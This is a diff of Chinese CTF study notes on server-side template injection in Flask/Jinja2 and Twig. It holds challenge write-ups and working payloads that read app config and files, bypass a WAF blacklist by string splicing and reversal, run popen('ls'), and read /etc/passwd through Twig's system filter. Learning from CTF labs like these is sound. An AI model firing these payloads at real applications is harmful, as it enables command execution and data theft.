@@ -1684,117 +1684,6 @@ servlet包含了路径信息，我们尝试包含一下FlagController所在路�
 这道题需要将请求方式改为POST，GET方式得不到想要的东西
 
 ## SSIT(服务端模板注入)
-### WesternCTF2018 shrine
-
-    源码
-
-  ```python
-    import flask
-    import os
-    app = flask.Flask(__name__)
-    app.config['FLAG'] = os.environ.pop('FLAG')
-    
-    //显示代码
-    @app.route('/')
-    def index():
-        return open(__file__).read()
-    
-    
-    @app.route('/shrine/')
-    def shrine(shrine):
-        def safe_jinja(s):
-            s = s.replace('(', '').replace(')', '')
-            blacklist = ['config', 'self']
-            return ''.join(['{{% set {}=None%}}'.format(c)for c in blacklist]) + s
-        return flask.render_template_string(safe_jinja(shrine))
-    
-    if __name__ == '__main__':
-    app.run(debug=True)
-  ```
-
-  ```python
-    os  python   # 文件目录方法模块，用来处理文件和目录
-    os.environ   # os模块环境变量
-    pop()        # pop() 方法删除字典给定键 key 所对应的值，返回值为被删除的值
-  ```
-
-  ```python
-    app = flask.Flask(__name__)
-    app.config['FLAG'] = os.environ.pop('FLAG')
-    #flask模块生成了app ，在app的config内定义了FLAG参数，参数的值为os环境变量的FLAG值
-  ```
-
-  从这里可以知道flag的位置
-
-  访问`/shrine/{{2*'2'}}`返回22 => jinja模板注入
-
-  源代码进行了两次过滤，分别过滤了 "(",")" 和config，self，但是要拿到flag必须用到config
-
-  利用python里面的内置函数，比如url_for和get_flashed_messages
-
-  ```python
-    config 对象:
-
-    config 对象就是Flask的config对象，也就是 app.config 对象。
-
-    {{ config.SQLALCHEMY_DATABASE_URI }}
-
-    url_for() 方法:
-
-    url_for() 会返回视图函数对应的URL。如果定义的视图函数是带有参数的，则可以将这些参数作为命名参数传入。
-
-    get_flashed_messages() 方法：
-
-    返回之前在Flask中通过 flash() 传入的flash信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用 get_flashed_messages() 方法取出(flash信息只能取出一次，取出后flash信息会被清空)。
-  ```
-
-  注入`{{url_for.__globals__}}`查看里面的变量信息
-
-  注入`{{url_for.__globals__['current_app'].config}}`获取flag
-
-### BJDCTF2020 The mystery of ip/Cookie is so stable
-
-1. 考点
-
-    1. X-Forwarded-For注入(The mystery of **ip**)
-
-       cookie注入(Cookie is so stable)
-    2. PHP可能存在Twig模版注入漏洞，Flask可能存在Jinjia2模版注入漏洞
-
-2. 解法
-
-    看网上的wp，都说是SSTI模板注入漏洞
-
-    有一种解题思路就是尝试在可能的注入点测试，尝试各种方法查看能否控制其输出内容
-
-    一种方法是：在参数后加{{}}，在花括号内写计算式查看页面输出的是结果还是计算式本身从而判断是否为SSTI模板注入。
-    ![模板类型判断](image.png)
-    这里的绿线表示结果成功返回，红线反之
-
-    ```txt
-    {{7*'7'}} 回显7777777 ==> Jinja2
-    {{7*'7'}} 回显49 ==> Twig
-    ```
-
-### GYCTF2020 FlaskApp
-
-1. 题目提示flask，可以尝试一下**SSIT**
-  
-  加密页面输入`{{2+2}}`页面正常返回base64加密后的密文，复制密文放到解码页面，得到结果4==>注入点在解码页面
-
-2. 在解密页面随便输入引发报错得到解码页面后端处理逻辑，发现有waf防护
-   
-   查看源码 `{{ c.__init__.__globals__['__builtins__'].open('app.py','r').read() }}`
-
-   waf 黑名单：`black_list = ["flag","os","system","popen","import","eval","chr","request", "subprocess","commands","socket","hex","base64","*","?"]`
-
-3. waf绕过方法有很多，字符串拼接、逆序等。
-   
-   字符串拼接：`{{c.__init__.__globals__.['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')}}`
-
-   逆序：`{{ c.__init__.__globals__['__builtins__'].open('txt.galf_eht_si_siht/'[::-1],'r').read() }}`
-
-
 
 ### SSTI payload:
 
@@ -1855,6 +1744,8 @@ __builtins__      内建模块的引用，在任何地方都是可见的(包括�
     # 下方payload中 '__init__'前面的都可以换成a,b,c...
 
     # os执行
+
+    lipsum.__globals__['os'].popen('ls').read()
 
     # 利用warnings.catch_warnings类
     # [].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache下有os类，可以直接执行命令：
@@ -1995,6 +1886,128 @@ Twig
 
     {{['cat /etc/passwd']|filter('system')}}
 ```
+
+### WesternCTF2018 shrine
+
+    源码
+
+  ```python
+    import flask
+    import os
+    app = flask.Flask(__name__)
+    app.config['FLAG'] = os.environ.pop('FLAG')
+    
+    //显示代码
+    @app.route('/')
+    def index():
+        return open(__file__).read()
+    
+    
+    @app.route('/shrine/')
+    def shrine(shrine):
+        def safe_jinja(s):
+            s = s.replace('(', '').replace(')', '')
+            blacklist = ['config', 'self']
+            return ''.join(['{{% set {}=None%}}'.format(c)for c in blacklist]) + s
+        return flask.render_template_string(safe_jinja(shrine))
+    
+    if __name__ == '__main__':
+    app.run(debug=True)
+  ```
+
+  ```python
+    os  python   # 文件目录方法模块，用来处理文件和目录
+    os.environ   # os模块环境变量
+    pop()        # pop() 方法删除字典给定键 key 所对应的值，返回值为被删除的值
+  ```
+
+  ```python
+    app = flask.Flask(__name__)
+    app.config['FLAG'] = os.environ.pop('FLAG')
+    #flask模块生成了app ，在app的config内定义了FLAG参数，参数的值为os环境变量的FLAG值
+  ```
+
+  从这里可以知道flag的位置
+
+  访问`/shrine/{{2*'2'}}`返回22 => jinja模板注入
+
+  源代码进行了两次过滤，分别过滤了 "(",")" 和config，self，但是要拿到flag必须用到config
+
+  利用python里面的内置函数，比如url_for和get_flashed_messages
+
+  ```python
+    config 对象:
+
+    config 对象就是Flask的config对象，也就是 app.config 对象。
+
+    {{ config.SQLALCHEMY_DATABASE_URI }}
+
+    url_for() 方法:
+
+    url_for() 会返回视图函数对应的URL。如果定义的视图函数是带有参数的，则可以将这些参数作为命名参数传入。
+
+    get_flashed_messages() 方法：
+
+    返回之前在Flask中通过 flash() 传入的flash信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用 get_flashed_messages() 方法取出(flash信息只能取出一次，取出后flash信息会被清空)。
+  ```
+
+  注入`{{url_for.__globals__}}`查看里面的变量信息
+
+  注入`{{url_for.__globals__['current_app'].config}}`获取flag
+
+### BJDCTF2020 The mystery of ip/Cookie is so stable
+
+1. 考点
+
+    1. X-Forwarded-For注入(The mystery of **ip**)
+
+       cookie注入(Cookie is so stable)
+    2. PHP可能存在Twig模版注入漏洞，Flask可能存在Jinjia2模版注入漏洞
+
+2. 解法
+
+    看网上的wp，都说是SSTI模板注入漏洞
+
+    有一种解题思路就是尝试在可能的注入点测试，尝试各种方法查看能否控制其输出内容
+
+    一种方法是：在参数后加{{}}，在花括号内写计算式查看页面输出的是结果还是计算式本身从而判断是否为SSTI模板注入。
+    ![模板类型判断](image.png)
+    这里的绿线表示结果成功返回，红线反之
+
+    ```txt
+    {{7*'7'}} 回显7777777 ==> Jinja2
+    {{7*'7'}} 回显49 ==> Twig
+    ```
+
+### GYCTF2020 FlaskApp
+
+1. 题目提示flask，可以尝试一下**SSIT**
+  
+  加密页面输入`{{2+2}}`页面正常返回base64加密后的密文，复制密文放到解码页面，得到结果4==>注入点在解码页面
+
+2. 在解密页面随便输入引发报错得到解码页面后端处理逻辑，发现有waf防护
+   
+   查看源码 `{{ c.__init__.__globals__['__builtins__'].open('app.py','r').read() }}`
+
+   waf 黑名单：`black_list = ["flag","os","system","popen","import","eval","chr","request", "subprocess","commands","socket","hex","base64","*","?"]`
+
+3. waf绕过方法有很多，字符串拼接、逆序等。
+   
+   字符串拼接：`{{c.__init__.__globals__.['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')}}`
+
+   逆序：`{{ c.__init__.__globals__['__builtins__'].open('txt.galf_eht_si_siht/'[::-1],'r').read() }}`
+
+### RootersCTF2019I_<3_Flask(Jinja2)
+
+**这道题目考点主要是两个工具`Arjun`和`tplmap`**
+
+1. 刚进去什么都没有，扫描目录，看源码什么都没发现
+2. 看过wp才知道主要是用工具
+3. 首先用`arjun`爆破参数，查找网站有哪些可用的参数
+4. 然后用`tplmap`探测模板注入漏洞以及getshell
+
+    [arjun Usage](https://github.com/s0md3v/Arjun/wiki/Usage)
+    [tplmap](https://github.com/epinna/tplmap)
 
 ## PHP伪协议
 
